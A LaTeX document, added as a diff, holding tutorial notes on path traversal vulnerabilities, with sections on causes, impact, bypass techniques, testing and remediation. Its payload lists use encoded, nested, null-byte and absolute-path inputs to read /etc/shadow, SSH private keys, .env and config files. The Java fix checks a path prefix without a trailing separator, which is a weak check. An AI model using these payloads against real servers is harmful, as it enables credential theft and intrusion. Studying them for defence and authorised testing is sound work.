@@ -1,0 +1,442 @@
+\documentclass{article}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{url}
+\usepackage{graphicx}
+\usepackage{geometry}
+\usepackage{listings}
+\usepackage{hyperref}
+\usepackage{multicol}
+\usepackage{array}
+\usepackage{booktabs}
+\usepackage{xcolor}
+\lstset{numbers=none, basicstyle=\ttfamily}
+\renewcommand{\lstlistingname}
+
+\geometry{a4paper, left=20mm, right=20mm, top=20mm, bottom=20mm}
+\title{Path traversal Vulnerability Notes}
+\author{Eyad Islam El-Taher}
+
+\begin{document}
+
+\maketitle
+
+\section*{Introduction}
+\textbf{Path traversal} (also known as directory traversal) is a web security vulnerability that allows attackers to read arbitrary files on the server running the application. This vulnerability enables unauthorized access to files outside the web root directory, potentially exposing:
+
+\begin{itemize}
+    \item \textbf{Application code and data}
+    \item \textbf{Credentials for back-end systems} 
+    \item \textbf{Sensitive operating system files}
+    \item \textbf{Configuration files and environment variables}
+\end{itemize}
+
+In more severe cases, attackers may also be able to \textbf{write to arbitrary files} on the server, allowing them to modify application data, alter system behavior, and ultimately gain full control of the server.
+
+\section*{Path Traversal Vulnerability Happen When}
+\begin{itemize}
+    \item \textbf{Unvalidated user input} is directly used in file system operations
+    \item \textbf{Improper sanitization} of user-supplied file paths
+    \item \textbf{Absence of input validation} for directory traversal sequences
+    \item \textbf{Weak server configurations} that don't restrict file access
+    \item \textbf{Insufficient access controls} on file retrieval functions
+\end{itemize}
+
+\section*{Path Traversal Vulnerability Happen Where}
+\begin{itemize}
+    \item \textbf{File download functionality} where users can request files
+    \item \textbf{Image/File upload features} with improper path handling
+    \item \textbf{Template inclusion mechanisms} in web applications
+    \item \textbf{Static file servers} serving user-requested resources
+    \item \textbf{API endpoints} that retrieve or serve files
+    \item \textbf{Configuration management interfaces}
+    \item \textbf{Backup and log viewing functionality}
+    \item \textbf{Any parameter that accepts file paths or names}:
+    \begin{itemize}
+        \item URL parameters: \texttt{?file=document.pdf}
+        \item Form fields in file uploads
+        \item HTTP headers in file requests
+        \item Cookie values containing path information
+    \end{itemize}
+\end{itemize}
+
+\section*{Impact of Path Traversal Vulnerability}
+\begin{itemize}
+    \item \textbf{Information Disclosure}:
+    \begin{itemize}
+        \item Exposure of application source code
+        \item Leakage of database credentials and configuration
+        \item Access to sensitive user data
+        \item Disclosure of system files (/etc/passwd, /etc/shadow)
+    \end{itemize}
+    
+    \item \textbf{System Compromise}:
+    \begin{itemize}
+        \item Reading SSH keys and certificates
+        \item Access to system logs and audit trails
+        \item Exposure of environment variables and API keys
+    \end{itemize}
+    
+    \item \textbf{Privilege Escalation}:
+    \begin{itemize}
+        \item Reading password files for brute force attacks
+        \item Access to configuration files with elevated privileges
+        \item Modification of critical system or application files
+    \end{itemize}
+    
+    \item \textbf{Complete Server Takeover}:
+    \begin{itemize}
+        \item In write-scenarios: uploading web shells
+        \item Modifying system configuration files
+        \item Creating backdoor access mechanisms
+        \item Compromising the entire server infrastructure
+    \end{itemize}
+    
+    \item \textbf{Business Impact}:
+    \begin{itemize}
+        \item Data breaches and regulatory fines
+        \item Reputational damage and loss of trust
+        \item Service disruption and downtime
+        \item Financial losses and legal consequences
+    \end{itemize}
+\end{itemize}
+
+\section*{Reading Arbitrary Files via Path Traversal}
+
+\subsection*{Basic Attack Scenario}
+\begin{itemize}
+    \item \textbf{Vulnerable Application}: Shopping site with image loading functionality
+    \item \textbf{HTML Code}: \texttt{<img src="/loadImage?filename=218.png">}
+    \item \textbf{Server Logic}: Appends filename to base directory \texttt{/var/www/images/}
+    \item \textbf{File Path Constructed}: \texttt{/var/www/images/218.png}
+\end{itemize}
+
+\subsection*{Path Traversal Exploitation}
+\begin{itemize}
+    \item \textbf{Attack URL}: 
+    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
+    https://insecure-website.com/loadImage?filename=../../../etc/passwd
+    \end{lstlisting}
+    
+    \item \textbf{Resulting File Path}:
+    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
+    /var/www/images/../../../etc/passwd
+    \end{lstlisting}
+    
+    \item \textbf{Directory Traversal Logic}:
+    \begin{itemize}
+        \item \texttt{../} steps up one directory level
+        \item \texttt{/var/www/images/../} → \texttt{/var/www/}
+        \item \texttt{/var/www/../} → \texttt{/var/}
+        \item \texttt{/var/../} → \texttt{/} (filesystem root)
+        \item Final path: \texttt{/etc/passwd}
+    \end{itemize}
+\end{itemize}
+
+\subsection*{Operating System Specific Sequences}
+\begin{itemize}
+    \item \textbf{Unix/Linux Systems}:
+    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
+    ../../../etc/passwd
+    ../../../../etc/shadow
+    ../var/log/auth.log
+    \end{lstlisting}
+    
+    \item \textbf{Windows Systems}:
+    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
+    ..\..\..\windows\win.ini
+    ..\..\..\windows\system32\drivers\etc\hosts
+    ..\..\..\boot.ini
+    \end{lstlisting}
+\end{itemize}
+
+\subsection*{Common Target Files}
+\begin{itemize}
+    \item \textbf{Linux/Unix}:
+    \begin{itemize}
+        \item \texttt{/etc/passwd} - User account information
+        \item \texttt{/etc/shadow} - Encrypted passwords
+        \item \texttt{/etc/hosts} - Static hostnames
+        \item \texttt{/proc/version} - Kernel version
+        \item \texttt{~/.ssh/id\_rsa} - SSH private keys
+        \item \texttt{/var/log/} - System logs
+    \end{itemize}
+    
+    \item \textbf{Windows}:
+    \begin{itemize}
+        \item \texttt{C:\textbackslash windows\textbackslash win.ini} - System configuration
+        \item \texttt{C:\textbackslash windows\textbackslash system32\textbackslash drivers\textbackslash etc\textbackslash hosts} - Hosts file
+        \item \texttt{C:\textbackslash boot.ini} - Boot configuration
+        \item \texttt{C:\textbackslash windows\textbackslash system.ini} - System settings
+    \end{itemize}
+\end{itemize}
+
+
+
+\section*{Bypass defenses against path traversal attacks}
+If an application strips or blocks directory traversal sequences from the user-supplied filename, it might be possible to bypass the defense using a variety of techniques.
+
+\begin{enumerate}
+    \item \textbf{\underline{Absolute Path Bypass}}
+    
+    \textbf{Core Concept:} The application only blocks relative path sequences (\texttt{../}) but doesn't check for absolute paths starting from the filesystem root.
+    
+    \textbf{How It Works:}
+    \begin{verbatim}
+    Normal Request:  /loadImage?filename=image.png
+    Server Path:     /var/www/images/image.png
+    
+    Blocked Attack:  /loadImage?filename=../../../etc/passwd
+    (Application detects and blocks '../')
+    
+    Working Attack:  /loadImage?filename=/etc/passwd
+    (Application allows it because no '../' found)
+    
+    Server Path:     /var/www/images//etc/passwd
+    Final Access:    /etc/passwd (due to path normalization)
+    \end{verbatim}
+    
+    \textbf{Why It Works:}
+    \begin{itemize}
+        \item Application only looks for and blocks \texttt{../} sequences
+        \item Absolute paths like \texttt{/etc/passwd} don't contain blocked patterns
+
+    \end{itemize}
+    
+	\item \textbf{\underline{Nested Traversal Sequences Bypass - The Double-Stripping Method}}
+    
+    \textbf{Core Concept:} The application has a naive filter that simply removes every instance of \texttt{../} it finds in your input.
+    
+    \textbf{How It Works:}
+    \begin{verbatim}
+    Your Input:     ....//....//....//etc/passwd
+    Filter Action:  Removes each inner '../' found
+    Step 1:         ....//  -> removes '../' -> becomes ../
+    Step 2:         ....//  -> removes '../' -> becomes ../
+    Step 3:         ....//  -> removes '../' -> becomes ../
+    Final Result:   ../../../etc/passwd
+    \end{verbatim}
+    
+    \textbf{Common Nested Sequences:}
+\begin{itemize}
+    \item \texttt{....//} → Becomes \texttt{../} after filtering
+    \item \texttt{....\textbackslash/} → Becomes \texttt{..\textbackslash} (Windows paths)
+\end{itemize}
+    
+    \textbf{Key Insight:} You're "over-encoding" the traversal sequence so the filter inadvertently decodes it back to the malicious payload it was trying to block.
+    
+    \hrulefill 
+    		
+        \item \textbf{\underline{URL Encoding Bypass}}
+
+\textbf{Core Concept:} Web servers or filters might strip plain traversal sequences, but miss URL-encoded versions that get decoded later in the process.
+
+\textbf{How It Works:}
+\begin{verbatim}
+Normal Blocked:   ../../../etc/passwd
+URL Encoded:      %2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+Double Encoded:   %252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+
+Server Process:
+1. Receives: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+2. URL Decodes: ../../../etc/passwd
+3. Application uses decoded path
+\end{verbatim}
+
+\textbf{Common Encoding Techniques:}
+\begin{itemize}
+    \item \texttt{\%2e\%2e\%2f} → URL encoded \texttt{../}
+    \item \texttt{\%252e\%252e\%252f} → Double URL encoded \texttt{../}
+    \item \texttt{..\%c0\%af} → Unicode/overlong encoding
+    \item \texttt{..\%ef\%bc\%8f} → Full-width slash encoding
+\end{itemize}
+
+\textbf{Burp Suite Tip:} Use Burp Intruder's predefined payload list "Fuzzing - path traversal" for automated testing of encoded sequences.
+
+\hrulefill
+
+        \item \textbf{\underline{Expected Base Folder Bypass}}
+
+\textbf{Core Concept:} App checks if filename starts with correct folder like \texttt{/var/www/images}, but doesn't check what comes after.
+
+\textbf{Simple Explanation:}
+\begin{verbatim}
+App expects:   /var/www/images/photo.png
+You provide:   /var/www/images/../../../etc/passwd
+
+App thinks:    "Starts with /var/www/images/    - ALLOWED"
+Result:        /var/www/images/../../../etc/passwd
+Final access:  /etc/passwd
+\end{verbatim}
+\newpage
+\textbf{Why It Works:}
+\begin{itemize}
+    \item App only validates the beginning of the path
+    \item Traversal sequences after the valid prefix still work
+    \item Path normalization processes the \texttt{../} normally
+\end{itemize}
+
+\textbf{Key Insight:} The application only checks the beginning of your input but doesn't validate the entire path, allowing you to "escape" from the allowed directory using traversal sequences after the valid prefix.
+
+\hrulefill
+
+\item \textbf{\underline{File Extension Bypass with Null Byte}}
+
+\textbf{Core Concept:} App requires filename to end with specific extension like \texttt{.png}, but null byte \texttt{\%00} terminates the string early.
+
+\textbf{Simple Explanation:}
+\begin{verbatim}
+App expects:   example.png
+You provide:   ../../../etc/passwd%00.png
+
+App thinks:    "Ends with .png   - ALLOWED"
+System reads:  ../../../etc/passwd (null byte stops here)
+Final access:  /etc/passwd
+\end{verbatim}
+
+\textbf{Why It Works:}
+\begin{itemize}
+    \item Null byte (\texttt{\%00}) tells system to stop reading
+    \item App sees \texttt{.png} extension and allows request
+    \item System ignores everything after null byte
+    \item Traversal sequences work normally before null byte
+\end{itemize}
+
+\textbf{Important Note:}
+\begin{itemize}
+    \item Works on older PHP versions (before 5.3.4)
+    \item Modern systems often block null byte injection
+    \item Still worth trying as a bypass technique
+\end{itemize}
+\end{enumerate}
+\hrulefill
+
+
+\section*{Testing Methodology}
+
+\subsection*{Manual Testing Steps}
+\begin{enumerate}
+    \item \textbf{Identify File Parameters}
+    \begin{itemize}
+        \item Look for parameters like: \texttt{file}, \texttt{filename}, \texttt{path}, \texttt{document}, \texttt{image}
+        \item Check URL parameters, POST data, cookies, and headers
+        \item Common endpoints: \texttt{/download}, \texttt{/view}, \texttt{/loadImage}, \texttt{/getFile}
+    \end{itemize}
+    
+    \item \textbf{Basic Traversal Testing}
+    \begin{verbatim}
+    ?file=../../../etc/passwd
+    ?filename=..\..\windows\win.ini
+    ?document=/etc/passwd
+    \end{verbatim}
+    
+    \item \textbf{Encoding Bypass Testing}
+    \begin{verbatim}
+    ?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+    ?file=%252e%252e%252f%252e%252e%252fetc/passwd
+    ?file=..%c0%af..%c0%af..%c0%afetc/passwd
+    \end{verbatim}
+
+    \item \textbf{Filter Bypass Testing}
+    \begin{verbatim}
+    ?file=....//....//....//etc/passwd
+    ?file=..\../..\../..\../etc/passwd
+    ?file=../../../etc/passwd%00.png
+    \end{verbatim}
+    
+    \item \textbf{Base Folder Bypass Testing}
+    \begin{verbatim}
+    ?file=/var/www/images/../../../etc/passwd
+    ?file=expected_folder/../../../../etc/passwd
+    \end{verbatim}
+\end{enumerate}
+
+\subsection*{Automated Testing with Burp Suite}
+\begin{itemize}
+    \item Use Burp Intruder with "Fuzzing - path traversal" payload list
+    \item Test multiple encoding types simultaneously
+    \item Monitor for different response lengths/sizes
+    \item Look for success responses (200) vs errors (404/403)
+\end{itemize}
+
+\subsection*{Common Files to Target}
+\begin{itemize}
+    \item \textbf{Linux:} \texttt{/etc/passwd}, \texttt{/etc/shadow}, \texttt{/proc/version}, \texttt{/etc/hosts}
+    \item \textbf{Windows:} \texttt{/windows/win.ini}, \texttt{/boot.ini}, \texttt{/windows/system.ini}
+    \item \textbf{Application:} \texttt{config.php}, \texttt{.env}, \texttt{web.config}, \texttt{application.properties}
+\end{itemize}
+
+\subsection*{Response Analysis}
+\begin{itemize}
+    \item \textbf{Success:} File contents in response, different response size
+    \item \textbf{Partial Success:} Error messages revealing path information
+    \item \textbf{Blocked:} Generic error pages, 403 Forbidden responses
+    \item \textbf{Not Found:} 404 errors indicating invalid path
+\end{itemize}
+
+\subsection*{Advanced Techniques}
+\begin{itemize}
+    \item Test with and without trailing slashes
+    \item Try different number of traversal sequences (../, ../../, etc.)
+    \item Combine multiple bypass techniques
+    \item Test in different contexts (URL, POST, headers)
+\end{itemize}
+
+\hrulefill
+
+\section*{Remediation and Prevention}
+
+\subsection*{Primary Defense: Avoid User Input in Filesystem APIs}
+\begin{itemize}
+    \item \textbf{Best Practice}: Avoid passing user-supplied input to filesystem APIs entirely
+    \item \textbf{Alternative Approach}: Rewrite application functions to deliver same behavior safely
+    \item \textbf{Example}: Use predefined file mappings instead of direct user input
+\end{itemize}
+
+\newpage
+\subsection*{Two-Layer Defense Strategy}
+If user input must be used, implement both layers:
+
+\subsubsection*{Layer 1: Input Validation}
+\begin{itemize}
+    \item \textbf{Whitelist Approach} (Recommended): Compare user input with allowed values only
+    \item \textbf{Content Validation}: If whitelist not possible, verify input contains only permitted characters (alphanumeric only)
+    \item \textbf{Reject}: Any input containing special characters, path separators, or traversal sequences
+\end{itemize}
+
+\subsubsection*{Layer 2: Path Canonicalization \& Verification}
+\begin{itemize}
+    \item \textbf{Append to Base}: Add user input to predefined base directory
+    \item \textbf{Canonicalize Path}: Use platform filesystem API to resolve path
+    \item \textbf{Verify Base}: Confirm canonical path starts with expected base directory
+\end{itemize}
+
+\subsection*{Java Implementation Example}
+\begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
+File file = new File(BASE_DIRECTORY, userInput);
+if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
+    // process file - SAFE
+} else {
+    // reject request - POTENTIAL ATTACK
+}
+\end{lstlisting}
+
+\subsection*{Additional Security Measures}
+\begin{itemize}
+    \item \textbf{Use Application-Level Access Controls}: Implement proper authentication and authorization
+    \item \textbf{Secure Configuration}: Ensure web server doesn't serve sensitive directories
+    \item \textbf{Regular Security Testing}: Include path traversal tests in security assessments
+    \item \textbf{Input Sanitization}: Remove or encode special characters when displaying file paths
+\end{itemize}
+
+\subsection*{Platform-Specific Recommendations}
+\begin{itemize}
+    \item \textbf{Java}: Use \texttt{getCanonicalPath()} and verify base directory
+    \item \textbf{PHP}: Use \texttt{realpath()} and compare with base path
+    \item \textbf{.NET}: Use \texttt{Path.GetFullPath()} and validate against base
+    \item \textbf{Python}: Use \texttt{os.path.realpath()} with base verification
+\end{itemize}
+
+
+
+\end{document}
